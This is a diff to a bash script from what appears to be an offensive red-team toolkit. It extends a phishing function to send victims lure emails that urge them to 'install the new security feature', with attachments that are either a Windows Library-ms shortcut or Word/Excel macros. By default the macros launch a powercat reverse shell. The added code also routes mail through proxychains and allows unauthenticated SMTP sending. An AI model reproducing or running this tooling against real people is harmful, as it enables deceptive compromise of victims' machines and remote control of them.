@@ -41,14 +41,37 @@ generate_windows_shortcut() {
 
 send_phishing_email() {
 
-    get_config_library
-    generate_windows_shortcut
-    if [[ ! -f body.txt ]]; then
-        echo "Email body file not found. Creating a new one."
-        echo "Hey!" > body.txt
-        echo "Please install the new security feature for your workstation" >> body.txt
-        echo "For this, download the attachment file, double-click on it, and execute the configuration shortcut within. Thanks!" >> body.txt
+    if [[ -z "$attachment_type" ]]; then
+        attachment_type="shortcut"
     fi
+    local attach_type_option=""
+    if [[ "$attachment_type" == "shortcut" ]]; then
+        get_config_library
+        generate_windows_shortcut
+        attachment=@config.Library-ms
+    elif [[ "$attachment_type" == "doc" ]]; then
+        get_word_macro
+        attach_type_option="--attach-type application/msword"
+        if [[ -z "$attachment" ]] || [[ ! -f "$attachment" ]]; then
+            echo "Attachment file not found. Please generate the Word attachment first."
+            return 1
+        fi
+    elif [[ "$attachment_type" == "xls" ]]; then
+        get_xls_macro
+        attach_type_option="--attach-type application/vnd.ms-excel"
+        if [[ -z "$attachment" ]] || [[ ! -f "$attachment" ]]; then
+            echo "Attachment file not found. Please generate the Excel attachment first."
+            return 1
+        fi
+    elif [[ "$attachment_type" == "xlsm" ]]; then
+        get_xls_macro
+        attach_type_option="--attach-type application/vnd.ms-excel.sheet.macroEnabled.12"
+        if [[ -z "$attachment" ]] || [[ ! -f "$attachment" ]]; then
+            echo "Attachment file not found. Please generate the Excel attachment first."
+            return 1
+        fi
+    fi
+
     if [[ -z "$target_email" ]]; then
         echo "Target email is not set. Please set it before sending the email."
         return 1
@@ -62,14 +85,53 @@ send_phishing_email() {
         return 1
     fi
     if [[ -z "$smtp_username" ]]; then
-        echo "SMTP username is not set. Please set it before sending the email."
-        return 1
+        echo "SMTP username is not set. Ensure that this is your intention."
     fi
     if [[ -z "$smtp_password" ]]; then
-        echo "SMTP password is not set. Please set it before sending the email."
-        return 1
+        echo "SMTP password is not set. Ensure that this is your intention"
     fi
-    swaks -t $target_email --from $sender_email --attach @config.Library-ms --header "Subject: Staging Script" --body @body.txt --server $smtp_server --auth LOGIN --auth-user $smtp_username --auth-password $smtp_password
+    if [[ ! -f email_header.txt ]]; then
+        echo "Creating email header file."
+        echo "Subject: Staging Script" > email_header.txt
+    fi
+    if [[ ! -f email_body.txt ]]; then
+        echo "Creating email body file."
+        echo "Hey!" > email_body.txt
+        echo "Please install the new security feature for your workstation" >> email_body.txt
+        echo "For this, download the attachment file, double-click on it, and execute the configuration shortcut within. Thanks!" >> email_body.txt
+    fi
+    local smtp_authentication=""
+    if [[ ! -z "$smtp_username" ]] && [[ ! -z "$smtp_password" ]]; then
+        smtp_authentication="--auth LOGIN --auth-user $smtp_username --auth-password $smtp_password"
+    fi
+    local proxychain_command=""
+    if [[ ! -z $use_proxychain ]] && [[ $use_proxychain == "true" ]]; then
+        proxychain_command="proxychains -q "
+        echo "Using proxychains for sending email."
+    else
+        proxychain_command=""
+    fi
+    ${proxychain_command}swaks -t $target_email --from $sender_email $attach_type_option --attach @$attachment --header "$email_header" --body @email_body.txt --server $smtp_server $smtp_authentication
+}
+
+get_word_macro() {
+    if [[ -z $cmd ]]; then
+        background_shell=false
+        cmd=$(get_powercat_reverse_shell)
+    fi
+    cp $SCRIPTDIR/../python/generate_macro.py .
+    python3 generate_macro.py doc "$cmd"
+
+}
+
+get_xls_macro() {
+    if [[ -z $cmd ]]; then
+        background_shell=false
+        cmd=$(get_powercat_reverse_shell)
+    fi
+    cp $SCRIPTDIR/../python/generate_macro.py .
+    python3 generate_macro.py xls "$cmd"
+
 }
 
 if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
